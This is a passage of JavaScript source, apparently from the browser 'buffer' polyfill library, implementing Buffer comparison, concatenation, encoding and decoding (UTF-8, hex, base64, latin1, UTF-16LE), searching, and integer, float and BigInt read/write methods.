0\n  }\n  return Buffer.alloc(+length)\n}\n\nBuffer.isBuffer = function isBuffer (b) {\n  return b != null && b._isBuffer === true &&\n    b !== Buffer.prototype // so Buffer.isBuffer(Buffer.prototype) will be false\n}\n\nBuffer.compare = function compare (a, b) {\n  if (isInstance(a, Uint8Array)) a = Buffer.from(a, a.offset, a.byteLength)\n  if (isInstance(b, Uint8Array)) b = Buffer.from(b, b.offset, b.byteLength)\n  if (!Buffer.isBuffer(a) || !Buffer.isBuffer(b)) {\n    throw new TypeError(\n      'The \"buf1\", \"buf2\" arguments must be one of type Buffer or Uint8Array'\n    )\n  }\n\n  if (a === b) return 0\n\n  let x = a.length\n  let y = b.length\n\n  for (let i = 0, len = Math.min(x, y); i < len; ++i) {\n    if (a[i] !== b[i]) {\n      x = a[i]\n      y = b[i]\n      break\n    }\n  }\n\n  if (x < y) return -1\n  if (y < x) return 1\n  return 0\n}\n\nBuffer.isEncoding = function isEncoding (encoding) {\n  switch (String(encoding).toLowerCase()) {\n    case 'hex':\n    case 'utf8':\n    case 'utf-8':\n    case 'ascii':\n    case 'latin1':\n    case 'binary':\n    case 'base64':\n    case 'ucs2':\n    case 'ucs-2':\n    case 'utf16le':\n    case 'utf-16le':\n      return true\n    default:\n      return false\n  }\n}\n\nBuffer.concat = function concat (list, length) {\n  if (!Array.isArray(list)) {\n    throw new TypeError('\"list\" argument must be an Array of Buffers')\n  }\n\n  if (list.length === 0) {\n    return Buffer.alloc(0)\n  }\n\n  let i\n  if (length === undefined) {\n    length = 0\n    for (i = 0; i < list.length; ++i) {\n      length += list[i].length\n    }\n  }\n\n  const buffer = Buffer.allocUnsafe(length)\n  let pos = 0\n  for (i = 0; i < list.length; ++i) {\n    let buf = list[i]\n    if (isInstance(buf, Uint8Array)) {\n      if (pos + buf.length > buffer.length) {\n        if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf)\n        buf.copy(buffer, pos)\n      } else {\n        Uint8Array.prototype.set.call(\n          buffer,\n          buf,\n          pos\n        )\n      }\n    } else if (!Buffer.isBuffer(buf)) {\n      throw new TypeError('\"list\" argument must be an Array of Buffers')\n    } else {\n      buf.copy(buffer, pos)\n    }\n    pos += buf.length\n  }\n  return buffer\n}\n\nfunction byteLength (string, encoding) {\n  if (Buffer.isBuffer(string)) {\n    return string.length\n  }\n  if (ArrayBuffer.isView(string) || isInstance(string, ArrayBuffer)) {\n    return string.byteLength\n  }\n  if (typeof string !== 'string') {\n    throw new TypeError(\n      'The \"string\" argument must be one of type string, Buffer, or ArrayBuffer. ' +\n      'Received type ' + typeof string\n    )\n  }\n\n  const len = string.length\n  const mustMatch = (arguments.length > 2 && arguments[2] === true)\n  if (!mustMatch && len === 0) return 0\n\n  // Use a for loop to avoid recursion\n  let loweredCase = false\n  for (;;) {\n    switch (encoding) {\n      case 'ascii':\n      case 'latin1':\n      case 'binary':\n        return len\n      case 'utf8':\n      case 'utf-8':\n        return utf8ToBytes(string).length\n      case 'ucs2':\n      case 'ucs-2':\n      case 'utf16le':\n      case 'utf-16le':\n        return len * 2\n      case 'hex':\n        return len >>> 1\n      case 'base64':\n        return base64ToBytes(string).length\n      default:\n        if (loweredCase) {\n          return mustMatch ? -1 : utf8ToBytes(string).length // assume utf8\n        }\n        encoding = ('' + encoding).toLowerCase()\n        loweredCase = true\n    }\n  }\n}\nBuffer.byteLength = byteLength\n\nfunction slowToString (encoding, start, end) {\n  let loweredCase = false\n\n  // No need to verify that \"this.length <= MAX_UINT32\" since it's a read-only\n  // property of a typed array.\n\n  // This behaves neither like String nor Uint8Array in that we set start/end\n  // to their upper/lower bounds if the value passed is out of range.\n  // undefined is handled specially as per ECMA-262 6th Edition,\n  // Section 13.3.3.7 Runtime Semantics: KeyedBindingInitialization.\n  if (start === undefined || start < 0) {\n    start = 0\n  }\n  // Return early if start > this.length. Done here to prevent potential uint32\n  // coercion fail below.\n  if (start > this.length) {\n    return ''\n  }\n\n  if (end === undefined || end > this.length) {\n    end = this.length\n  }\n\n  if (end <= 0) {\n    return ''\n  }\n\n  // Force coercion to uint32. This will also coerce falsey/NaN values to 0.\n  end >>>= 0\n  start >>>= 0\n\n  if (end <= start) {\n    return ''\n  }\n\n  if (!encoding) encoding = 'utf8'\n\n  while (true) {\n    switch (encoding) {\n      case 'hex':\n        return hexSlice(this, start, end)\n\n      case 'utf8':\n      case 'utf-8':\n        return utf8Slice(this, start, end)\n\n      case 'ascii':\n        return asciiSlice(this, start, end)\n\n      case 'latin1':\n      case 'binary':\n        return latin1Slice(this, start, end)\n\n      case 'base64':\n        return base64Slice(this, start, end)\n\n      case 'ucs2':\n      case 'ucs-2':\n      case 'utf16le':\n      case 'utf-16le':\n        return utf16leSlice(this, start, end)\n\n      default:\n        if (loweredCase) throw new TypeError('Unknown encoding: ' + encoding)\n        encoding = (encoding + '').toLowerCase()\n        loweredCase = true\n    }\n  }\n}\n\n// This property is used by `Buffer.isBuffer` (and the `is-buffer` npm package)\n// to detect a Buffer instance. It's not possible to use `instanceof Buffer`\n// reliably in a browserify context because there could be multiple different\n// copies of the 'buffer' package in use. This method works even for Buffer\n// instances that were created from another copy of the `buffer` package.\n// See: https://github.com/feross/buffer/issues/154\nBuffer.prototype._isBuffer = true\n\nfunction swap (b, n, m) {\n  const i = b[n]\n  b[n] = b[m]\n  b[m] = i\n}\n\nBuffer.prototype.swap16 = function swap16 () {\n  const len = this.length\n  if (len % 2 !== 0) {\n    throw new RangeError('Buffer size must be a multiple of 16-bits')\n  }\n  for (let i = 0; i < len; i += 2) {\n    swap(this, i, i + 1)\n  }\n  return this\n}\n\nBuffer.prototype.swap32 = function swap32 () {\n  const len = this.length\n  if (len % 4 !== 0) {\n    throw new RangeError('Buffer size must be a multiple of 32-bits')\n  }\n  for (let i = 0; i < len; i += 4) {\n    swap(this, i, i + 3)\n    swap(this, i + 1, i + 2)\n  }\n  return this\n}\n\nBuffer.prototype.swap64 = function swap64 () {\n  const len = this.length\n  if (len % 8 !== 0) {\n    throw new RangeError('Buffer size must be a multiple of 64-bits')\n  }\n  for (let i = 0; i < len; i += 8) {\n    swap(this, i, i + 7)\n    swap(this, i + 1, i + 6)\n    swap(this, i + 2, i + 5)\n    swap(this, i + 3, i + 4)\n  }\n  return this\n}\n\nBuffer.prototype.toString = function toString () {\n  const length = this.length\n  if (length === 0) return ''\n  if (arguments.length === 0) return utf8Slice(this, 0, length)\n  return slowToString.apply(this, arguments)\n}\n\nBuffer.prototype.toLocaleString = Buffer.prototype.toString\n\nBuffer.prototype.equals = function equals (b) {\n  if (!Buffer.isBuffer(b)) throw new TypeError('Argument must be a Buffer')\n  if (this === b) return true\n  return Buffer.compare(this, b) === 0\n}\n\nBuffer.prototype.inspect = function inspect () {\n  let str = ''\n  const max = exports.INSPECT_MAX_BYTES\n  str = this.toString('hex', 0, max).replace(/(.{2})/g, '$1 ').trim()\n  if (this.length > max) str += ' ... '\n  return '<Buffer ' + str + '>'\n}\nif (customInspectSymbol) {\n  Buffer.prototype[customInspectSymbol] = Buffer.prototype.inspect\n}\n\nBuffer.prototype.compare = function compare (target, start, end, thisStart, thisEnd) {\n  if (isInstance(target, Uint8Array)) {\n    target = Buffer.from(target, target.offset, target.byteLength)\n  }\n  if (!Buffer.isBuffer(target)) {\n    throw new TypeError(\n      'The \"target\" argument must be one of type Buffer or Uint8Array. ' +\n      'Received type ' + (typeof target)\n    )\n  }\n\n  if (start === undefined) {\n    start = 0\n  }\n  if (end === undefined) {\n    end = target ? target.length : 0\n  }\n  if (thisStart === undefined) {\n    thisStart = 0\n  }\n  if (thisEnd === undefined) {\n    thisEnd = this.length\n  }\n\n  if (start < 0 || end > target.length || thisStart < 0 || thisEnd > this.length) {\n    throw new RangeError('out of range index')\n  }\n\n  if (thisStart >= thisEnd && start >= end) {\n    return 0\n  }\n  if (thisStart >= thisEnd) {\n    return -1\n  }\n  if (start >= end) {\n    return 1\n  }\n\n  start >>>= 0\n  end >>>= 0\n  thisStart >>>= 0\n  thisEnd >>>= 0\n\n  if (this === target) return 0\n\n  let x = thisEnd - thisStart\n  let y = end - start\n  const len = Math.min(x, y)\n\n  const thisCopy = this.slice(thisStart, thisEnd)\n  const targetCopy = target.slice(start, end)\n\n  for (let i = 0; i < len; ++i) {\n    if (thisCopy[i] !== targetCopy[i]) {\n      x = thisCopy[i]\n      y = targetCopy[i]\n      break\n    }\n  }\n\n  if (x < y) return -1\n  if (y < x) return 1\n  return 0\n}\n\n// Finds either the first index of `val` in `buffer` at offset >= `byteOffset`,\n// OR the last index of `val` in `buffer` at offset <= `byteOffset`.\n//\n// Arguments:\n// - buffer - a Buffer to search\n// - val - a string, Buffer, or number\n// - byteOffset - an index into `buffer`; will be clamped to an int32\n// - encoding - an optional encoding, relevant is val is a string\n// - dir - true for indexOf, false for lastIndexOf\nfunction bidirectionalIndexOf (buffer, val, byteOffset, encoding, dir) {\n  // Empty buffer means no match\n  if (buffer.length === 0) return -1\n\n  // Normalize byteOffset\n  if (typeof byteOffset === 'string') {\n    encoding = byteOffset\n    byteOffset = 0\n  } else if (byteOffset > 0x7fffffff) {\n    byteOffset = 0x7fffffff\n  } else if (byteOffset < -0x80000000) {\n    byteOffset = -0x80000000\n  }\n  byteOffset = +byteOffset // Coerce to Number.\n  if (numberIsNaN(byteOffset)) {\n    // byteOffset: it it's undefined, null, NaN, \"foo\", etc, search whole buffer\n    byteOffset = dir ? 0 : (buffer.length - 1)\n  }\n\n  // Normalize byteOffset: negative offsets start from the end of the buffer\n  if (byteOffset < 0) byteOffset = buffer.length + byteOffset\n  if (byteOffset >= buffer.length) {\n    if (dir) return -1\n    else byteOffset = buffer.length - 1\n  } else if (byteOffset < 0) {\n    if (dir) byteOffset = 0\n    else return -1\n  }\n\n  // Normalize val\n  if (typeof val === 'string') {\n    val = Buffer.from(val, encoding)\n  }\n\n  // Finally, search either indexOf (if dir is true) or lastIndexOf\n  if (Buffer.isBuffer(val)) {\n    // Special case: looking for empty string/buffer always fails\n    if (val.length === 0) {\n      return -1\n    }\n    return arrayIndexOf(buffer, val, byteOffset, encoding, dir)\n  } else if (typeof val === 'number') {\n    val = val & 0xFF // Search for a byte value [0-255]\n    if (typeof Uint8Array.prototype.indexOf === 'function') {\n      if (dir) {\n        return Uint8Array.prototype.indexOf.call(buffer, val, byteOffset)\n      } else {\n        return Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset)\n      }\n    }\n    return arrayIndexOf(buffer, [val], byteOffset, encoding, dir)\n  }\n\n  throw new TypeError('val must be string, number or Buffer')\n}\n\nfunction arrayIndexOf (arr, val, byteOffset, encoding, dir) {\n  let indexSize = 1\n  let arrLength = arr.length\n  let valLength = val.length\n\n  if (encoding !== undefined) {\n    encoding = String(encoding).toLowerCase()\n    if (encoding === 'ucs2' || encoding === 'ucs-2' ||\n        encoding === 'utf16le' || encoding === 'utf-16le') {\n      if (arr.length < 2 || val.length < 2) {\n        return -1\n      }\n      indexSize = 2\n      arrLength /= 2\n      valLength /= 2\n      byteOffset /= 2\n    }\n  }\n\n  function read (buf, i) {\n    if (indexSize === 1) {\n      return buf[i]\n    } else {\n      return buf.readUInt16BE(i * indexSize)\n    }\n  }\n\n  let i\n  if (dir) {\n    let foundIndex = -1\n    for (i = byteOffset; i < arrLength; i++) {\n      if (read(arr, i) === read(val, foundIndex === -1 ? 0 : i - foundIndex)) {\n        if (foundIndex === -1) foundIndex = i\n        if (i - foundIndex + 1 === valLength) return foundIndex * indexSize\n      } else {\n        if (foundIndex !== -1) i -= i - foundIndex\n        foundIndex = -1\n      }\n    }\n  } else {\n    if (byteOffset + valLength > arrLength) byteOffset = arrLength - valLength\n    for (i = byteOffset; i >= 0; i--) {\n      let found = true\n      for (let j = 0; j < valLength; j++) {\n        if (read(arr, i + j) !== read(val, j)) {\n          found = false\n          break\n        }\n      }\n      if (found) return i\n    }\n  }\n\n  return -1\n}\n\nBuffer.prototype.includes = function includes (val, byteOffset, encoding) {\n  return this.indexOf(val, byteOffset, encoding) !== -1\n}\n\nBuffer.prototype.indexOf = function indexOf (val, byteOffset, encoding) {\n  return bidirectionalIndexOf(this, val, byteOffset, encoding, true)\n}\n\nBuffer.prototype.lastIndexOf = function lastIndexOf (val, byteOffset, encoding) {\n  return bidirectionalIndexOf(this, val, byteOffset, encoding, false)\n}\n\nfunction hexWrite (buf, string, offset, length) {\n  offset = Number(offset) || 0\n  const remaining = buf.length - offset\n  if (!length) {\n    length = remaining\n  } else {\n    length = Number(length)\n    if (length > remaining) {\n      length = remaining\n    }\n  }\n\n  const strLen = string.length\n\n  if (length > strLen / 2) {\n    length = strLen / 2\n  }\n  let i\n  for (i = 0; i < length; ++i) {\n    const parsed = parseInt(string.substr(i * 2, 2), 16)\n    if (numberIsNaN(parsed)) return i\n    buf[offset + i] = parsed\n  }\n  return i\n}\n\nfunction utf8Write (buf, string, offset, length) {\n  return blitBuffer(utf8ToBytes(string, buf.length - offset), buf, offset, length)\n}\n\nfunction asciiWrite (buf, string, offset, length) {\n  return blitBuffer(asciiToBytes(string), buf, offset, length)\n}\n\nfunction base64Write (buf, string, offset, length) {\n  return blitBuffer(base64ToBytes(string), buf, offset, length)\n}\n\nfunction ucs2Write (buf, string, offset, length) {\n  return blitBuffer(utf16leToBytes(string, buf.length - offset), buf, offset, length)\n}\n\nBuffer.prototype.write = function write (string, offset, length, encoding) {\n  // Buffer#write(string)\n  if (offset === undefined) {\n    encoding = 'utf8'\n    length = this.length\n    offset = 0\n  // Buffer#write(string, encoding)\n  } else if (length === undefined && typeof offset === 'string') {\n    encoding = offset\n    length = this.length\n    offset = 0\n  // Buffer#write(string, offset[, length][, encoding])\n  } else if (isFinite(offset)) {\n    offset = offset >>> 0\n    if (isFinite(length)) {\n      length = length >>> 0\n      if (encoding === undefined) encoding = 'utf8'\n    } else {\n      encoding = length\n      length = undefined\n    }\n  } else {\n    throw new Error(\n      'Buffer.write(string, encoding, offset[, length]) is no longer supported'\n    )\n  }\n\n  const remaining = this.length - offset\n  if (length === undefined || length > remaining) length = remaining\n\n  if ((string.length > 0 && (length < 0 || offset < 0)) || offset > this.length) {\n    throw new RangeError('Attempt to write outside buffer bounds')\n  }\n\n  if (!encoding) encoding = 'utf8'\n\n  let loweredCase = false\n  for (;;) {\n    switch (encoding) {\n      case 'hex':\n        return hexWrite(this, string, offset, length)\n\n      case 'utf8':\n      case 'utf-8':\n        return utf8Write(this, string, offset, length)\n\n      case 'ascii':\n      case 'latin1':\n      case 'binary':\n        return asciiWrite(this, string, offset, length)\n\n      case 'base64':\n        // Warning: maxLength not taken into account in base64Write\n        return base64Write(this, string, offset, length)\n\n      case 'ucs2':\n      case 'ucs-2':\n      case 'utf16le':\n      case 'utf-16le':\n        return ucs2Write(this, string, offset, length)\n\n      default:\n        if (loweredCase) throw new TypeError('Unknown encoding: ' + encoding)\n        encoding = ('' + encoding).toLowerCase()\n        loweredCase = true\n    }\n  }\n}\n\nBuffer.prototype.toJSON = function toJSON () {\n  return {\n    type: 'Buffer',\n    data: Array.prototype.slice.call(this._arr || this, 0)\n  }\n}\n\nfunction base64Slice (buf, start, end) {\n  if (start === 0 && end === buf.length) {\n    return base64.fromByteArray(buf)\n  } else {\n    return base64.fromByteArray(buf.slice(start, end))\n  }\n}\n\nfunction utf8Slice (buf, start, end) {\n  end = Math.min(buf.length, end)\n  const res = []\n\n  let i = start\n  while (i < end) {\n    const firstByte = buf[i]\n    let codePoint = null\n    let bytesPerSequence = (firstByte > 0xEF)\n      ? 4\n      : (firstByte > 0xDF)\n          ? 3\n          : (firstByte > 0xBF)\n              ? 2\n              : 1\n\n    if (i + bytesPerSequence <= end) {\n      let secondByte, thirdByte, fourthByte, tempCodePoint\n\n      switch (bytesPerSequence) {\n        case 1:\n          if (firstByte < 0x80) {\n            codePoint = firstByte\n          }\n          break\n        case 2:\n          secondByte = buf[i + 1]\n          if ((secondByte & 0xC0) === 0x80) {\n            tempCodePoint = (firstByte & 0x1F) << 0x6 | (secondByte & 0x3F)\n            if (tempCodePoint > 0x7F) {\n              codePoint = tempCodePoint\n            }\n          }\n          break\n        case 3:\n          secondByte = buf[i + 1]\n          thirdByte = buf[i + 2]\n          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {\n            tempCodePoint = (firstByte & 0xF) << 0xC | (secondByte & 0x3F) << 0x6 | (thirdByte & 0x3F)\n            if (tempCodePoint > 0x7FF && (tempCodePoint < 0xD800 || tempCodePoint > 0xDFFF)) {\n              codePoint = tempCodePoint\n            }\n          }\n          break\n        case 4:\n          secondByte = buf[i + 1]\n          thirdByte = buf[i + 2]\n          fourthByte = buf[i + 3]\n          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80 && (fourthByte & 0xC0) === 0x80) {\n            tempCodePoint = (firstByte & 0xF) << 0x12 | (secondByte & 0x3F) << 0xC | (thirdByte & 0x3F) << 0x6 | (fourthByte & 0x3F)\n            if (tempCodePoint > 0xFFFF && tempCodePoint < 0x110000) {\n              codePoint = tempCodePoint\n            }\n          }\n      }\n    }\n\n    if (codePoint === null) {\n      // we did not generate a valid codePoint so insert a\n      // replacement char (U+FFFD) and advance only 1 byte\n      codePoint = 0xFFFD\n      bytesPerSequence = 1\n    } else if (codePoint > 0xFFFF) {\n      // encode to utf16 (surrogate pair dance)\n      codePoint -= 0x10000\n      res.push(codePoint >>> 10 & 0x3FF | 0xD800)\n      codePoint = 0xDC00 | codePoint & 0x3FF\n    }\n\n    res.push(codePoint)\n    i += bytesPerSequence\n  }\n\n  return decodeCodePointsArray(res)\n}\n\n// Based on http://stackoverflow.com/a/22747272/680742, the browser with\n// the lowest limit is Chrome, with 0x10000 args.\n// We go 1 magnitude less, for safety\nconst MAX_ARGUMENTS_LENGTH = 0x1000\n\nfunction decodeCodePointsArray (codePoints) {\n  const len = codePoints.length\n  if (len <= MAX_ARGUMENTS_LENGTH) {\n    return String.fromCharCode.apply(String, codePoints) // avoid extra slice()\n  }\n\n  // Decode in chunks to avoid \"call stack size exceeded\".\n  let res = ''\n  let i = 0\n  while (i < len) {\n    res += String.fromCharCode.apply(\n      String,\n      codePoints.slice(i, i += MAX_ARGUMENTS_LENGTH)\n    )\n  }\n  return res\n}\n\nfunction asciiSlice (buf, start, end) {\n  let ret = ''\n  end = Math.min(buf.length, end)\n\n  for (let i = start; i < end; ++i) {\n    ret += String.fromCharCode(buf[i] & 0x7F)\n  }\n  return ret\n}\n\nfunction latin1Slice (buf, start, end) {\n  let ret = ''\n  end = Math.min(buf.length, end)\n\n  for (let i = start; i < end; ++i) {\n    ret += String.fromCharCode(buf[i])\n  }\n  return ret\n}\n\nfunction hexSlice (buf, start, end) {\n  const len = buf.length\n\n  if (!start || start < 0) start = 0\n  if (!end || end < 0 || end > len) end = len\n\n  let out = ''\n  for (let i = start; i < end; ++i) {\n    out += hexSliceLookupTable[buf[i]]\n  }\n  return out\n}\n\nfunction utf16leSlice (buf, start, end) {\n  const bytes = buf.slice(start, end)\n  let res = ''\n  // If bytes.length is odd, the last 8 bits must be ignored (same as node.js)\n  for (let i = 0; i < bytes.length - 1; i += 2) {\n    res += String.fromCharCode(bytes[i] + (bytes[i + 1] * 256))\n  }\n  return res\n}\n\nBuffer.prototype.slice = function slice (start, end) {\n  const len = this.length\n  start = ~~start\n  end = end === undefined ? len : ~~end\n\n  if (start < 0) {\n    start += len\n    if (start < 0) start = 0\n  } else if (start > len) {\n    start = len\n  }\n\n  if (end < 0) {\n    end += len\n    if (end < 0) end = 0\n  } else if (end > len) {\n    end = len\n  }\n\n  if (end < start) end = start\n\n  const newBuf = this.subarray(start, end)\n  // Return an augmented `Uint8Array` instance\n  Object.setPrototypeOf(newBuf, Buffer.prototype)\n\n  return newBuf\n}\n\n/*\n * Need to make sure that buffer isn't trying to write out of bounds.\n */\nfunction checkOffset (offset, ext, length) {\n  if ((offset % 1) !== 0 || offset < 0) throw new RangeError('offset is not uint')\n  if (offset + ext > length) throw new RangeError('Trying to access beyond buffer length')\n}\n\nBuffer.prototype.readUintLE =\nBuffer.prototype.readUIntLE = function readUIntLE (offset, byteLength, noAssert) {\n  offset = offset >>> 0\n  byteLength = byteLength >>> 0\n  if (!noAssert) checkOffset(offset, byteLength, this.length)\n\n  let val = this[offset]\n  let mul = 1\n  let i = 0\n  while (++i < byteLength && (mul *= 0x100)) {\n    val += this[offset + i] * mul\n  }\n\n  return val\n}\n\nBuffer.prototype.readUintBE =\nBuffer.prototype.readUIntBE = function readUIntBE (offset, byteLength, noAssert) {\n  offset = offset >>> 0\n  byteLength = byteLength >>> 0\n  if (!noAssert) {\n    checkOffset(offset, byteLength, this.length)\n  }\n\n  let val = this[offset + --byteLength]\n  let mul = 1\n  while (byteLength > 0 && (mul *= 0x100)) {\n    val += this[offset + --byteLength] * mul\n  }\n\n  return val\n}\n\nBuffer.prototype.readUint8 =\nBuffer.prototype.readUInt8 = function readUInt8 (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 1, this.length)\n  return this[offset]\n}\n\nBuffer.prototype.readUint16LE =\nBuffer.prototype.readUInt16LE = function readUInt16LE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 2, this.length)\n  return this[offset] | (this[offset + 1] << 8)\n}\n\nBuffer.prototype.readUint16BE =\nBuffer.prototype.readUInt16BE = function readUInt16BE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 2, this.length)\n  return (this[offset] << 8) | this[offset + 1]\n}\n\nBuffer.prototype.readUint32LE =\nBuffer.prototype.readUInt32LE = function readUInt32LE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 4, this.length)\n\n  return ((this[offset]) |\n      (this[offset + 1] << 8) |\n      (this[offset + 2] << 16)) +\n      (this[offset + 3] * 0x1000000)\n}\n\nBuffer.prototype.readUint32BE =\nBuffer.prototype.readUInt32BE = function readUInt32BE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 4, this.length)\n\n  return (this[offset] * 0x1000000) +\n    ((this[offset + 1] << 16) |\n    (this[offset + 2] << 8) |\n    this[offset + 3])\n}\n\nBuffer.prototype.readBigUInt64LE = defineBigIntMethod(function readBigUInt64LE (offset) {\n  offset = offset >>> 0\n  validateNumber(offset, 'offset')\n  const first = this[offset]\n  const last = this[offset + 7]\n  if (first === undefined || last === undefined) {\n    boundsError(offset, this.length - 8)\n  }\n\n  const lo = first +\n    this[++offset] * 2 ** 8 +\n    this[++offset] * 2 ** 16 +\n    this[++offset] * 2 ** 24\n\n  const hi = this[++offset] +\n    this[++offset] * 2 ** 8 +\n    this[++offset] * 2 ** 16 +\n    last * 2 ** 24\n\n  return BigInt(lo) + (BigInt(hi) << BigInt(32))\n})\n\nBuffer.prototype.readBigUInt64BE = defineBigIntMethod(function readBigUInt64BE (offset) {\n  offset = offset >>> 0\n  validateNumber(offset, 'offset')\n  const first = this[offset]\n  const last = this[offset + 7]\n  if (first === undefined || last === undefined) {\n    boundsError(offset, this.length - 8)\n  }\n\n  const hi = first * 2 ** 24 +\n    this[++offset] * 2 ** 16 +\n    this[++offset] * 2 ** 8 +\n    this[++offset]\n\n  const lo = this[++offset] * 2 ** 24 +\n    this[++offset] * 2 ** 16 +\n    this[++offset] * 2 ** 8 +\n    last\n\n  return (BigInt(hi) << BigInt(32)) + BigInt(lo)\n})\n\nBuffer.prototype.readIntLE = function readIntLE (offset, byteLength, noAssert) {\n  offset = offset >>> 0\n  byteLength = byteLength >>> 0\n  if (!noAssert) checkOffset(offset, byteLength, this.length)\n\n  let val = this[offset]\n  let mul = 1\n  let i = 0\n  while (++i < byteLength && (mul *= 0x100)) {\n    val += this[offset + i] * mul\n  }\n  mul *= 0x80\n\n  if (val >= mul) val -= Math.pow(2, 8 * byteLength)\n\n  return val\n}\n\nBuffer.prototype.readIntBE = function readIntBE (offset, byteLength, noAssert) {\n  offset = offset >>> 0\n  byteLength = byteLength >>> 0\n  if (!noAssert) checkOffset(offset, byteLength, this.length)\n\n  let i = byteLength\n  let mul = 1\n  let val = this[offset + --i]\n  while (i > 0 && (mul *= 0x100)) {\n    val += this[offset + --i] * mul\n  }\n  mul *= 0x80\n\n  if (val >= mul) val -= Math.pow(2, 8 * byteLength)\n\n  return val\n}\n\nBuffer.prototype.readInt8 = function readInt8 (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 1, this.length)\n  if (!(this[offset] & 0x80)) return (this[offset])\n  return ((0xff - this[offset] + 1) * -1)\n}\n\nBuffer.prototype.readInt16LE = function readInt16LE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 2, this.length)\n  const val = this[offset] | (this[offset + 1] << 8)\n  return (val & 0x8000) ? val | 0xFFFF0000 : val\n}\n\nBuffer.prototype.readInt16BE = function readInt16BE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 2, this.length)\n  const val = this[offset + 1] | (this[offset] << 8)\n  return (val & 0x8000) ? val | 0xFFFF0000 : val\n}\n\nBuffer.prototype.readInt32LE = function readInt32LE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 4, this.length)\n\n  return (this[offset]) |\n    (this[offset + 1] << 8) |\n    (this[offset + 2] << 16) |\n    (this[offset + 3] << 24)\n}\n\nBuffer.prototype.readInt32BE = function readInt32BE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 4, this.length)\n\n  return (this[offset] << 24) |\n    (this[offset + 1] << 16) |\n    (this[offset + 2] << 8) |\n    (this[offset + 3])\n}\n\nBuffer.prototype.readBigInt64LE = defineBigIntMethod(function readBigInt64LE (offset) {\n  offset = offset >>> 0\n  validateNumber(offset, 'offset')\n  const first = this[offset]\n  const last = this[offset + 7]\n  if (first === undefined || last === undefined) {\n    boundsError(offset, this.length - 8)\n  }\n\n  const val = this[offset + 4] +\n    this[offset + 5] * 2 ** 8 +\n    this[offset + 6] * 2 ** 16 +\n    (last << 24) // Overflow\n\n  return (BigInt(val) << BigInt(32)) +\n    BigInt(first +\n    this[++offset] * 2 ** 8 +\n    this[++offset] * 2 ** 16 +\n    this[++offset] * 2 ** 24)\n})\n\nBuffer.prototype.readBigInt64BE = defineBigIntMethod(function readBigInt64BE (offset) {\n  offset = offset >>> 0\n  validateNumber(offset, 'offset')\n  const first = this[offset]\n  const last = this[offset + 7]\n  if (first === undefined || last === undefined) {\n    boundsError(offset, this.length - 8)\n  }\n\n  const val = (first << 24) + // Overflow\n    this[++offset] * 2 ** 16 +\n    this[++offset] * 2 ** 8 +\n    this[++offset]\n\n  return (BigInt(val) << BigInt(32)) +\n    BigInt(this[++offset] * 2 ** 24 +\n    this[++offset] * 2 ** 16 +\n    this[++offset] * 2 ** 8 +\n    last)\n})\n\nBuffer.prototype.readFloatLE = function readFloatLE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 4, this.length)\n  return ieee754.read(this, offset, true, 23, 4)\n}\n\nBuffer.prototype.readFloatBE = function readFloatBE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 4, this.length)\n  return ieee754.read(this, offset, false, 23, 4)\n}\n\nBuffer.prototype.readDoubleLE = function readDoubleLE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 8, this.length)\n  return ieee754.read(this, offset, true, 52, 8)\n}\n\nBuffer.prototype.readDoubleBE = function readDoubleBE (offset, noAssert) {\n  offset = offset >>> 0\n  if (!noAssert) checkOffset(offset, 8, this.length)\n  return ieee754.read(this, offset, false, 52, 8)\n}\n\nfunction checkInt (buf, value, offset, ext, max, min) {\n  if (!Buffer.isBuffer(buf)) throw new TypeError('\"buffer\" argument must be a Buffer instance')\n  if (value > max || value < min) throw new RangeError('\"value\" argument is out of bounds')\n  if (offset + ext > buf.length) throw new RangeError('Index out of range')\n}\n\nBuffer.prototype.writeUintLE =\nBuffer.prototype.writeUIntLE = function writeUIntLE (value, offset, byteLength, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  byteLength = byteLength >>> 0\n  if (!noAssert) {\n    const maxBytes = Math.pow(2, 8 * byteLength) - 1\n    checkInt(this, value, offset, byteLength, maxBytes, 0)\n  }\n\n  let mul = 1\n  let i = 0\n  this[offset] = value & 0xFF\n  while (++i < byteLength && (mul *= 0x100)) {\n    this[offset + i] = (value / mul) & 0xFF\n  }\n\n  return offset + byteLength\n}\n\nBuffer.prototype.writeUintBE =\nBuffer.prototype.writeUIntBE = function writeUIntBE (value, offset, byteLength, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  byteLength = byteLength >>> 0\n  if (!noAssert) {\n    const maxBytes = Math.pow(2, 8 * byteLength) - 1\n    checkInt(this, value, offset, byteLength, maxBytes, 0)\n  }\n\n  let i = byteLength - 1\n  let mul = 1\n  this[offset + i] = value & 0xFF\n  while (--i >= 0 && (mul *= 0x100)) {\n    this[offset + i] = (value / mul) & 0xFF\n  }\n\n  return offset + byteLength\n}\n\nBuffer.prototype.writeUint8 =\nBuffer.prototype.writeUInt8 = function writeUInt8 (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 1, 0xff, 0)\n  this[offset] = (value & 0xff)\n  return offset + 1\n}\n\nBuffer.prototype.writeUint16LE =\nBuffer.prototype.writeUInt16LE = function writeUInt16LE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)\n  this[offset] = (value & 0xff)\n  